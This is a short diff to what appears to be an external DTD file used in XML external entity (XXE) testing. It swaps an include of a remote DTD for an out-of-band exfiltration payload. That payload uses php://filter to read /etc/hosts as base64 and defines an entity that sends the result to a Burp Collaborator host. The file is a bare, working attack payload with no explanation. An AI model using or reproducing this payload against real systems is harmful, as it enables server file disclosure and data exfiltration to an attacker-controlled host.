@@ -1,2 +1,3 @@
-<!ENTITY % extz SYSTEM "https://raw.githubusercontent.com/vsr2390/test.com/main/test1.dtd">
-%extz;
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
+<!ENTITY % read "<!ENTITY % send SYSTEM 'https://6mtqrej7ash0pmhq6wf3f0dz0q6gu5.burpcollaborator.net/?%file;'>">
+
